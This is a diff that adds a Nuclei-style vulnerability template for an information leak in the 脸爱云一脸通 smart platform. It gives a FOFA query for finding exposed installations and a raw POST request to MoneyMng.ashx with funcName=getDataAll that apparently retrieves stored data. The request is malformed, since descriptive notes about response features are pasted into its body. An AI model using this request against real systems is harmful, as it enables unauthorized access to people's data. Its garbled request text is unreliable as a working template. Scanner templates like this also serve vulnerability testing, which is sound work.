@@ -1,0 +1,57 @@
+id: poc-nv7rxod2n9w02hft
+info:
+  name: 脸爱云一脸通智慧平台 MoneyMng.ashx 信息泄露
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nv7rxod2n9w02hft'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: nv7rxod2n9w02hft
+    fofa: body="View/UserReserved/UserReservedTest.aspx"
+http:
+- raw:
+  - 'POST /MoneyMng.ashx HTTP/1.1
+
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    Connection: close
+
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+
+    X-Requested-With: XMLHttpRequest
+
+
+
+
+    funcName=getDataAll
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    getDay
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
